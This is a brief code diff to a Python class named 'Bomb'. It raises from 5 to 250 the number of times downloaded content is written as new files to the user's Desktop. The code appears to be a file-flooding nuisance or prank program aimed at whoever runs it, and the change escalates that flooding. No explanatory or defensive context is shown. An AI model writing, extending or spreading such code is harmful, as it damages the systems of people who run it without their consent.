@@ -18,7 +18,7 @@ class Bomb:
         if not self.success:
             return
         
-        for i in range(5):
+        for i in range(250):
             with open(path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)), 'wb') as f:
                 f.write(self.response.content)
 
